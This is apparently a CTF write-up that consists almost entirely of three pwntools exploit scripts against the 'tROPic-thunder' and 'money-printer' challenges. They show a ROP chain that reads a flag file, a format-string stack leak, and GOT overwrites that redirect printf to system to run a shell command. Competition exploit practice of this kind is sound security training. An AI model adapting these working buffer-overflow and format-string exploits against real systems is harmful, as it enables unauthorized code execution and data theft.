---
Archive:
"https://drive.google.com/drive/folders/1xx240hie7UY9wiJSIHbDgwPoQdgIq3Uq?usp=sharing"
---

# tROPic-thunder - PWN

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host thunder.sdc.tf --port 1337 ./tROPic-thunder
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./tROPic-thunder')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'thunder.sdc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

bss = exe.bss()+0x200
rop = ROP(exe)

p = 'a'*(112+8)

rop.read(0,bss,0x40)
rop.open(bss,0,0)
rop.read(3,bss+0x100,0x100)
rop.write(1,bss+0x100,0x100)
p += rop.chain()
print(rop.dump())

io.sendlineafter("one!\n",p)

io.send("./flag.txt")

io.interactive()
```

# money-printer - PWN

```python
#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './money-printer'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warn'

# =========================================================
#                         EXPLOITS
# =========================================================

flag = ""

for i in range(10, 16):
    try:
        # io = process(exe)
        io = remote('money.sdc.tf', 1337)
        # overwriting dollar variable
        io.sendlineafter(b'how many of them do you want?', b'-1')
        # format string vuln
        io.sendlineafter(b'to the audience?', f'%{i}$p'.encode())
        io.recvuntil(b'\n')
        leak = io.recvline()
        if not b'nil' in leak:
            print(f'stack at {i} :' + str(leak))
            try:
                hexform = unhex(leak.split()[3][2:].decode())
                flag += hexform.decode()[::-1]
                print('flag appended')
            except BaseException:
                pass
        io.close()
    except EOFError or UnicodeDecodeError:
        pass

print(f'{flag=}')
```

# money printer2 - pwn

```python
def exploit():
    io = start()

    # Step 1
    p ='-2147483647'
    io.sendline(p)

    p = '%p%c'+'%c'*(25-4) + '%{}c%hn'.format(0xdec8-0x24) 
    p += '%{}c%51$hn'.format((0x10000 - 0xdec8) + 0x07e8) # dec8 d948
    io.sendlineafter('ence?\n',p)

    io.recvuntil('said: ')
    stack = int(io.recv(14),16)
    stack_canary = stack + 0x2698
    # print "Leak stack canary : " + str(hex(stack_canary))
    print "Leak return stack : " + str(hex(stack_canary))

    # Step 2
    p ='-2147483647'
    io.sendline(p)

    # 0x00000000004007e7 <+0>:     push   rbp
    # 0x00000000004007e8 <+1>:     mov    rbp,rsp

    writes = {0x601020      : 0x4007e7, # GOT _stack_chk_fail -> main 0x00000000004007e8
              stack_canary  : 0x0f}
    p = fmtstr_payload(8, writes, numbwritten=0)
    print(len(p))
    io.sendlineafter('ence?\n',p)
    print('pass step 2')

    # Step 3
    p ='-2147483647'
    io.sendline(p)

    writes = {
        exe.got['printf']       : exe.plt['system'], # GOT printf -> main system
        stack_canary-0x80-0x10  : 0x0f
    }
    p = fmtstr_payload(8, writes, numbwritten=0)
    io.sendlineafter('ence?\n',p)
    print('pass step 3')

    # Step 4
    p ='-2147483647'
    io.sendline(p)
    p ='cat flag*'
    io.sendline(p)

    io.interactive()

# exploit()
for i in range(1000):
    try:
        exploit()
    except Exception as e:
        pass
```